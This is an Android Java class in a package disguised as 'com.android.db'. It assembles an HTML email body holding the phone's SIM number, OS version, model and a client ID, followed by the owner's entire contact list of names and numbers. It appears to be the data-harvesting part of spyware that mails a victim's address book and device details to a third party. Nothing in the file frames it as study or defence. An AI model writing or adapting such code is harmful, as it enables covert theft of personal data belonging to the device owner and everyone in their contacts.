package com.android.db;

import java.util.List;

import javax.mail.Multipart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;

import android.content.Context;
import android.os.Build;

import com.android.pojo.PhoneInfo;
import com.android.utils.Utils;

public class PhoneMailBody implements MailBody {

	public String body = "<html><style>table.gridtable {	font-family: verdana,arial,sans-serif;	font-size:11px;	color:#333333;	border-width: 1px;	border-color: #666666;	border-collapse: collapse;width:100%}table.gridtable th {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #dedede;}table.gridtable td {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #ffffff;}</style><body>";
	public String bodyend = "</body></html>";
	private Context context;
	private List<PhoneInfo> lphone;
	

	public PhoneMailBody(Context context) {
		this.context = context;
	}

	@Override
	public Multipart getMultipart() {
		// TODO Auto-generated method stub
		Multipart multipart = null;
		try {
			SqlUtils su = SqlUtils.getinstance(context);
			StringBuffer html = new StringBuffer();
			html.append(body);
			html.append("<div style='font-size:13px;'>本机号码(SIM卡号码)"
					+ Utils.getnum(context) + " ,系统版本" + Build.VERSION.SDK_INT
					+ " ,手机型号" + Build.MODEL + "--" + Build.PRODUCT + " "
					+ Utils.getStringConfig(context, "clientid", "")
					+ "</div><br/>");

			html.append(bodyend);
			html.append("<div style='font-size:11px;'>通讯录</div><br/>");
			lphone = su.getPhoneContacts();
			html.append(GetPhoneCon(lphone));
			
			html.append(bodyend);
			multipart = new MimeMultipart();
			MimeBodyPart htmlbody = new MimeBodyPart();
			htmlbody.setContent(html.toString(), "text/html; charset=utf-8");
			multipart.addBodyPart(htmlbody);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			multipart = null;
		}
		return multipart;

	}

	@Override
	public boolean DeleteData() {
		// TODO Auto-generated method stub
		
		return true;
	}

	

	public String GetPhoneCon(List<PhoneInfo> lphone) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>编号</th><th style='width:150px'>名字</th><th style='width:80px'>号码</th></tr>");
			int i = 0;
			for (PhoneInfo pi : lphone) {
				i++;
				table.append("<tr><td>" + (i + 1) + "</td><td>" + pi.getName()
						+ "</td><td>" + pi.getNumber() + "</td></tr>");
			}
			if (lphone.size() == 0) {
				table.append("<td colspan='6'>无数据</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	

}
